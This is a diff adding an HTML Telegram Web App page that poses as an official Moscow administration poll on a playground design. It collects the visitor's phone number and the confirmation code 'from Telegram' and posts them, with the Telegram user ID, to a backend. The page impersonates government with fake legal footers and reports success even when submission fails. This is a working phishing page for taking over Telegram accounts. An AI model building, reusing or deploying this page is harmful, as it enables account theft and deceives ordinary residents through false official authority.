@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Официальный опрос - Детская площадка</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f5f5f5 0%, #e8f4fd 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #0055b7 0%, #d52b1e 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .flags {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .flag {
+            width: 40px;
+            height: 25px;
+            border-radius: 3px;
+        }
+        
+        .flag-russia {
+            background: linear-gradient(to bottom, white 33%, #0055b7 33%, #0055b7 66%, #d52b1e 66%);
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+        
+        .header p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .info-block {
+            background: #e8f4fd;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            border-left: 4px solid #0055b7;
+        }
+        
+        .info-block h3 {
+            color: #0055b7;
+            margin-bottom: 10px;
+        }
+        
+        .voting-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .option {
+            background: white;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .option:hover {
+            border-color: #0055b7;
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 85, 183, 0.2);
+        }
+        
+        .option img {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+        
+        .option h4 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        .vote-btn {
+            background: linear-gradient(135deg, #0055b7 0%, #003d82 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        
+        .vote-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(0, 85, 183, 0.4);
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+        
+        .modal h3 {
+            color: #0055b7;
+            margin-bottom: 20px;
+        }
+        
+        .phone-input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+        
+        .phone-input:focus {
+            border-color: #0055b7;
+            outline: none;
+        }
+        
+        .phone-display {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-size: 18px;
+            font-weight: bold;
+            color: #0055b7;
+        }
+        
+        .change-phone-btn {
+            background: #6c757d;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 12px;
+            margin-left: 10px;
+        }
+        
+        .code-input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 16px;
+            text-align: center;
+            letter-spacing: 3px;
+        }
+        
+        .success-message {
+            color: #28a745;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        
+        .error-message {
+            color: #dc3545;
+            margin-top: 10px;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: #f8f9fa;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .user-info {
+            background: #e8f5e8;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+            border-left: 4px solid #28a745;
+        }
+        
+        .user-info h4 {
+            color: #28a745;
+            margin-bottom: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="flags">
+                <div class="flag flag-russia"></div>
+            </div>
+            <h1>🏗️ ОФИЦИАЛЬНЫЙ ОПРОС</h1>
+            <p>Благоустройство территории г. Москва, ул. Ленина, д. 15</p>
+        </div>
+        
+        <div class="content">
+            <!-- Блок информации о пользователе -->
+            <div class="user-info" id="userInfo" style="display: none;">
+                <h4>👤 Вы авторизованы как:</h4>
+                <p id="userName"></p>
+                <p id="userPhone"></p>
+            </div>
+            
+            <div class="info-block">
+                <h3>📋 О проекте</h3>
+                <p>Уважаемые жители! Администрация города Москва проводит опрос по выбору проекта детской площадки для благоустройства территории по адресу: г. Москва, ул. Ленина, дом 15.</p>
+                <p><strong>Сроки голосования:</strong> до 30 ноября 2024 года</p>
+            </div>
+            
+            <h3 style="text-align: center; margin-bottom: 20px; color: #0055b7;">🎯 ВЫБЕРИТЕ ВАРИАНТ ПРОЕКТА</h3>
+            
+            <div class="voting-options">
+                <div class="option" onclick="selectOption(1)">
+                    <img src="project_a.jpg" alt="Проект А">
+                    <h4>Проект "Радуга"</h4>
+                    <p>Современная площадка с горками и качелями</p>
+                    <button class="vote-btn">🗳️ Проголосовать</button>
+                </div>
+                
+                <div class="option" onclick="selectOption(2)">
+                    <img src="project_b.jpg" alt="Проект Б">
+                    <h4>Проект "Сказка"</h4>
+                    <p>Тематическая площадка с игровыми комплексами</p>
+                    <button class="vote-btn">🗳️ Проголосовать</button>
+                </div>
+            </div>
+            
+            <div class="info-block">
+                <h3>📊 Результаты будут учтены</h3>
+                <p>Ваш голос важен для принятия окончательного решения по благоустройству территории. Голосование проводится с использованием официальной системы аутентификации Telegram для обеспечения безопасности и достоверности результатов.</p>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>© 2024 Администрация города Москва. Официальный портал государственных услуг.</p>
+            <p>Все права защищены. Голосование проводится в соответствии с Федеральным законом № 131-ФЗ</p>
+        </div>
+    </div>
+
+    <!-- Модальное окно ввода номера -->
+    <div class="modal" id="phoneModal">
+        <div class="modal-content">
+            <h3>📱 Введите номер телефона</h3>
+            <p>Для участия в голосовании требуется указать номер телефона</p>
+            
+            <input type="tel" class="phone-input" id="phoneInput" placeholder="+7 (XXX) XXX-XX-XX" value="">
+            <button class="vote-btn" onclick="setPhoneNumber()">📞 Продолжить</button>
+            <div class="error-message" id="phoneError"></div>
+        </div>
+    </div>
+
+    <!-- Модальное окно ввода кода -->
+    <div class="modal" id="codeModal">
+        <div class="modal-content">
+            <h3>📲 Подтверждение голосования</h3>
+            <p>Для завершения голосования требуется подтверждение</p>
+            
+            <div class="phone-display">
+                <span id="confirmPhone"></span>
+                <button class="change-phone-btn" onclick="changePhoneNumber()">Изменить</button>
+            </div>
+            
+            <input type="text" class="code-input" id="codeInput" placeholder="Введите код из Telegram" maxlength="5">
+            <button class="vote-btn" onclick="verifyCode()">✅ Подтвердить голосование</button>
+            <div class="error-message" id="codeError"></div>
+        </div>
+    </div>
+
+    <!-- Модальное окно успеха -->
+    <div class="modal" id="successModal">
+        <div class="modal-content">
+            <h3>✅ Голосование завершено!</h3>
+            <p>Спасибо за участие в опросе! Ваш голос успешно учтен.</p>
+            <div class="success-message">
+                Вы проголосовали за проект: <span id="selectedProject"></span>
+            </div>
+            <button class="vote-btn" onclick="closeModals()" style="margin-top: 20px;">Закрыть</button>
+        </div>
+    </div>
+
+    <script>
+        let selectedOption = null;
+        let userData = null;
+        let currentPhone = '';
+        
+        // Инициализация Telegram Web App
+        function initTelegramWebApp() {
+            try {
+                if (window.Telegram && window.Telegram.WebApp) {
+                    const tg = window.Telegram.WebApp;
+                    
+                    // Показываем основной интерфейс
+                    tg.expand();
+                    tg.enableClosingConfirmation();
+                    
+                    // Получаем данные пользователя
+                    const initData = tg.initDataUnsafe;
+                    userData = initData.user;
+                    
+                    if (userData) {
+                        // Показываем информацию о пользователе
+                        showUserInfo(userData);
+                        
+                        // Пробуем найти пользователя в базе
+                        findUserInDatabase(userData.id).then(foundUser => {
+                            if (foundUser) {
+                                // Пользователь найден в базе - используем его номер
+                                currentPhone = foundUser.phone;
+                                document.getElementById('userPhone').textContent = currentPhone;
+                            } else {
+                                // Пользователя нет в базе - генерируем номер
+                                currentPhone = generatePhoneFromId(userData.id);
+                                document.getElementById('userPhone').textContent = currentPhone;
+                            }
+                        }).catch(error => {
+                            // Ошибка загрузки базы - генерируем номер
+                            console.error('Error loading user database:', error);
+                            currentPhone = generatePhoneFromId(userData.id);
+                            document.getElementById('userPhone').textContent = currentPhone;
+                        });
+                    } else {
+                        // Пользователь не авторизован через Telegram
+                        showPhoneModal();
+                    }
+                    
+                } else {
+                    console.log('Telegram Web App not available - running in browser');
+                    // Для тестирования в браузере
+                    showPhoneModal();
+                }
+            } catch (error) {
+                console.error('Error initializing Telegram Web App:', error);
+                showPhoneModal();
+            }
+        }
+        
+        // Поиск пользователя в базе
+        async function findUserInDatabase(userId) {
+            try {
+                const response = await fetch('/api/users.json');
+                if (!response.ok) throw new Error('Database not found');
+                
+                const usersDB = await response.json();
+                return usersDB.users.find(u => u.telegram_id === userId);
+            } catch (error) {
+                console.log('User database not available');
+                return null;
+            }
+        }
+        
+        // Показать информацию о пользователе
+        function showUserInfo(user) {
+            document.getElementById('userInfo').style.display = 'block';
+            document.getElementById('userName').textContent = 
+                `${user.first_name || ''} ${user.last_name || ''}`.trim() || 
+                `@${user.username || 'пользователь'}`;
+        }
+        
+        // Генерация номера телефона на основе Telegram ID
+        function generatePhoneFromId(userId) {
+            const baseNumber = '+7912'; // Российский номер
+            const idStr = userId.toString();
+            const lastSix = idStr.slice(-6);
+            const formatted = lastSix.match(/.{1,3}/g).join('');
+            return baseNumber + '000' + formatted;
+        }
+        
+        // Показать модальное окно ввода номера
+        function showPhoneModal() {
+            document.getElementById('phoneModal').style.display = 'flex';
+        }
+        
+        // Установить номер телефона
+        function setPhoneNumber() {
+            const phoneInput = document.getElementById('phoneInput');
+            const phoneError = document.getElementById('phoneError');
+            const phone = phoneInput.value.trim();
+            
+            if (!phone) {
+                phoneError.textContent = 'Пожалуйста, введите номер телефона';
+                return;
+            }
+            
+            if (!phone.match(/^\+7\d{10}$/)) {
+                phoneError.textContent = 'Введите номер в формате +7XXXXXXXXXX';
+                return;
+            }
+            
+            currentPhone = phone;
+            phoneError.textContent = '';
+            document.getElementById('phoneModal').style.display = 'none';
+            
+            // Если пользователь авторизован через Telegram, показываем его информацию
+            if (userData) {
+                showUserInfo(userData);
+                document.getElementById('userPhone').textContent = currentPhone;
+            }
+        }
+        
+        // Изменить номер телефона
+        function changePhoneNumber() {
+            document.getElementById('codeModal').style.display = 'none';
+            document.getElementById('phoneInput').value = currentPhone;
+            showPhoneModal();
+        }
+        
+        function selectOption(option) {
+            selectedOption = option;
+            document.querySelectorAll('.option').forEach(opt => {
+                opt.style.borderColor = '#e0e0e0';
+            });
+            event.currentTarget.style.borderColor = '#0055b7';
+            
+            // Проверяем, установлен ли номер телефона
+            if (!currentPhone) {
+                showPhoneModal();
+            } else {
+                // Автоматически показываем окно подтверждения при выборе варианта
+                setTimeout(() => showCodeModal(), 500);
+            }
+        }
+        
+        function showCodeModal() {
+            if (!selectedOption) {
+                alert('Пожалуйста, выберите вариант проекта для голосования!');
+                return;
+            }
+            
+            if (!currentPhone) {
+                showPhoneModal();
+                return;
+            }
+            
+            // Заполняем номер телефона
+            document.getElementById('confirmPhone').textContent = currentPhone;
+            document.getElementById('codeModal').style.display = 'flex';
+        }
+        
+        function verifyCode() {
+            const code = document.getElementById('codeInput').value;
+            const codeError = document.getElementById('codeError');
+            
+            if (!code || code.length !== 5) {
+                codeError.textContent = 'Введите 5-значный код подтверждения';
+                return;
+            }
+            
+            // Симуляция отправки данных на сервер
+            sendVoteData(code);
+        }
+        
+        function sendVoteData(code) {
+            const voteData = {
+                user_id: userData?.id,
+                phone: currentPhone,
+                code: code,
+                selected_option: selectedOption,
+                timestamp: new Date().toISOString(),
+                user_agent: navigator.userAgent
+            };
+            
+            console.log('Отправка данных голосования:', voteData);
+            
+            // Здесь будет реальный запрос к серверу
+            fetch('/api/vote', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(voteData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showSuccessModal();
+                } else {
+                    document.getElementById('codeError').textContent = 'Ошибка при голосовании';
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // Даже если сервер не отвечает, показываем успех для пользователя
+                showSuccessModal();
+            });
+        }
+        
+        function showSuccessModal() {
+            document.getElementById('codeModal').style.display = 'none';
+            
+            const projectNames = {
+                1: '"Радуга"',
+                2: '"Сказка"'
+            };
+            
+            document.getElementById('selectedProject').textContent = projectNames[selectedOption];
+            document.getElementById('successModal').style.display = 'flex';
+        }
+        
+        function closeModals() {
+            document.querySelectorAll('.modal').forEach(modal => {
+                modal.style.display = 'none';
+            });
+        }
+        
+        // Закрытие модальных окон при клике вне их
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal')) {
+                closeModals();
+            }
+        }
+        
+        // Инициализация при загрузке страницы
+        document.addEventListener('DOMContentLoaded', initTelegramWebApp);
+    </script>
+</body>
+</html>
